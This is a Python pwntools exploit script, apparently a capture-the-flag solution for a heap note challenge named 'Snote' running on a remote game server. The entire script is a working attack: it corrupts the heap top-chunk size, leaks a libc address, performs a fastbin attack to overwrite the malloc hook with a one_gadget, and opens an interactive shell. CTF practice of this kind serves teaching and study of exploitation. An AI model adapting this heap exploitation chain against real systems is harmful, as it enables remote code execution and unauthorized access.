from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

context(arch = 'amd64', os = 'linux')

debug=0
if debug==0:
    io = remote("55fca716.gamectf.com",37009)
    elf=ELF("./Snote")
elif debug==1:
    io =  process("./Snote")
    elf=ELF("./Snote")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

def add(size,content):
    ru('Your choice > ')
    sl(1)    
    ru('Size > ')
    sl(size)
    ru('Content > \n')
    s(content)
def show():#once
    ru('Your choice > ')
    sl(2)    
def delete():#once
    ru('Your choice > ')
    sl(3)    
def edit(size,content):
    ru('Your choice > ')
    sl(4)    
    ru('Size > ')
    sl(size)
    ru('Content > \n')
    s(content)

ru("What's your name?\n")
sl("Q1IQ")
c="1"
add(0x70-8,"0"*(0x70-8))
add(0x70-8,"1"*(0x70-8))
edit(0x70,"2"*(0x70-8)+p64(0xf21))
add(0x1000,"3")
add(0x70-8,"0"*8)
show()
leak=u64(ru("Done")[8:16])
log.success(hex(leak))
libc.address=leak-0x3c5188
log.success(hex(libc.address))
delete()
edit(8,p64(libc.address+0x3c4b10-0x23))
add(0x70-8,"0"*(0x70-8))
onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
onegadget=libc.address+onegadgets[2]
c="d"*0xB+p64(0)+p64(onegadget)+'\x00'*8
#c="d"*0xB+p64(onegadget)+p64(libc.symbols['realloc'])+'\x00'*8
add(0x70-8,c)
ru('Your choice > ')
sl(1)    
ru('Size > ')
sl(0x10)
io.interactive()